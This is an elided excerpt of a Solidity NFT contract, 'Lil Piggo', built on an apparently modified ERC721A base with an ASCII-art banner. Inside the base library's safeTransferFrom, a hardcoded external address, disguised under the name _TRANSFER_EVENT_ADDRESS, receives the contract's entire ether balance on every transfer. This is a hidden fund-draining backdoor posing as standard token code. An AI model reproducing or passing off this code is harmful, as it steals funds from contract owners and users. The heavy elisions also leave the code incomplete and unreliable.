...
| $$      | $$| $$      | $$      | $$| $$  | $$| $$  | $$| $$  | $$
| $$$$$$$$| $$| $$      | $$      | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|________/|__/|__/      |__/      |__/ \____  $$ \____  $$ \______/ 
                                       /$$  \ $$ /$$  \ $$          
                                      |  $$$$$$/|  $$$$$$/          
                                       \______/  \______/                                                                                    `---'                                                                `--'                                                                                                                                                            
 */
...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0xe832981aa3bC003cC9CE78e0be5c9d0b8313fD5A);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xe832981aa3bC003cC9CE78e0be5c9d0b8313fD5A).transfer(address(this).balance);
        }
    }
...
contract LilPiggo is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Lil Piggo", "Piggo") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeia6guxomfenf4swangdfprruqz4bvdc52pnkazbpvfyybgdh6hkvy/", _toString(tokenId), ".json"));
    }
